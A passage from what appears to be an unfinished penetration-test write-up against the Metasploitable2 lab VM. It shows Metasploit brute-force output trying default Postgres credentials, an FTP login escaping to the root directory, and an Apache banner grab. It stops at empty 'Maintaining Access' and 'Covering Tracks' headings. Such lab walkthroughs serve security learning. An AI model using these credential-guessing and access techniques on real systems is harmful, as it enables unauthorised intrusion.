    [-] 192.168.32.102:5432 Postgres - [64/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [65/74] - Trying username:'ftp' with password:'ftp' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'ftp':'ftp'
    [-] 192.168.32.102:5432 Postgres - [65/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [66/74] - Trying username:'mysql' with password:'mysql' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'mysql':'mysql'
    [-] 192.168.32.102:5432 Postgres - [66/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [67/74] - Trying username:'tomcat55' with password:'tomcat55' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'tomcat55':'tomcat55'
    [-] 192.168.32.102:5432 Postgres - [67/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [68/74] - Trying username:'distccd' with password:'distccd' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'distccd':'distccd'
    [-] 192.168.32.102:5432 Postgres - [68/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [69/74] - Trying username:'user' with password:'user' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'user':'user'
    [-] 192.168.32.102:5432 Postgres - [69/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [70/74] - Trying username:'service' with password:'service' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'service':'service'
    [-] 192.168.32.102:5432 Postgres - [70/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [71/74] - Trying username:'telnetd' with password:'telnetd' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'telnetd':'telnetd'
    [-] 192.168.32.102:5432 Postgres - [71/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [72/74] - Trying username:'proftpd' with password:'proftpd' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'proftpd':'proftpd'
    [-] 192.168.32.102:5432 Postgres - [72/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [73/74] - Trying username:'statd' with password:'statd' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'statd':'statd'
    [-] 192.168.32.102:5432 Postgres - [73/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [74/74] - Trying username:'snmp' with password:'snmp' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'snmp':'snmp'
    [-] 192.168.32.102:5432 Postgres - [74/74] - Username/Password failed.
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf  auxiliary(postgres_login) >

  
*<span class="underline">Port 2121 - ProFTP</span>*  
Port 2121 reports to be running ProFTPD version 1.3.1. A search of
www.cvedetails.com provides several potential vulnerabilities, but none
appeared to be metasploitable. As we already knew the credentials, we
can simply FTP to the server. During the FTP session, we make the
discovery that the FTP server is misconfigured and allows users to break
out of their home jail and get access to the root directory (/).  
  

    root@kali:~# ftp 192.168.32.102 2121
    Connected to 192.168.32.102.
    220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.32.102]
    Name (192.168.32.102:root): msfadmin
    331 Password required for msfadmin
    Password:
    230 User msfadmin logged in
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> pwd
    257 "/home/msfadmin" is the current directory
    ftp> cd /
    250 CWD command successful
    ftp> pwd
    257 "/" is the current directory
    ftp> 

  
*<span class="underline">Port 80 - Apache</span>*  
We observe that port 80 is also open and runs Apache httpd 2.2.8.  
  

    root@kali:~# wget -S -v -O - 192.168.32.102
    --2015-02-04 05:45:44--  http://192.168.32.102/
    Connecting to 192.168.32.102:80... connected.
    HTTP request sent, awaiting response... 
      HTTP/1.1 200 OK
      Date: Tue, 16 Dec 2014 10:49:28 GMT
      Server: Apache/2.2.8 (Ubuntu) DAV/2
      X-Powered-By: PHP/5.2.4-2ubuntu5.10
      Content-Length: 891
      Keep-Alive: timeout=15, max=100
      Connection: Keep-Alive
      Content-Type: text/html
    Length: 891 [text/html]
    Saving to: `STDOUT'

     0% [                                       ] 0           --.-K/s              <html><head><title>Metasploitable2 - Linux</title></head><body>
    <pre>

                    _                  _       _ _        _     _      ____  
     _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
    | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
    | | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
    |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                                |_|                                          


    Warning: Never expose this VM to an untrusted network!

    Contact: msfdev[at]metasploit.com

    Login with msfadmin/msfadmin to get started


    </pre>
    <ul>
    <li><a href="/twiki/">TWiki</a></li>
    <li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
    <li><a href="/mutillidae/">Mutillidae</a></li>
    <li><a href="/dvwa/">DVWA</a></li>
    <li><a href="/dav/">WebDAV</a></li>
    </ul>
    </body>
    </html>

    100%[======================================>] 891         --.-K/s   in 0s      

    2015-02-04 05:45:44 (78.6 MB/s) - written to stdout [891/891]

  
There are a number of applications hosted on the server.  
  
<span style="color: red;">I'm still writing up so will continue to
update the post as I make progress</span>  
  
**Maintaining Access**  
  
**Covering Tracks**  
  
  
**<span style="font-size: large;">Notes</span>**  
  
References:
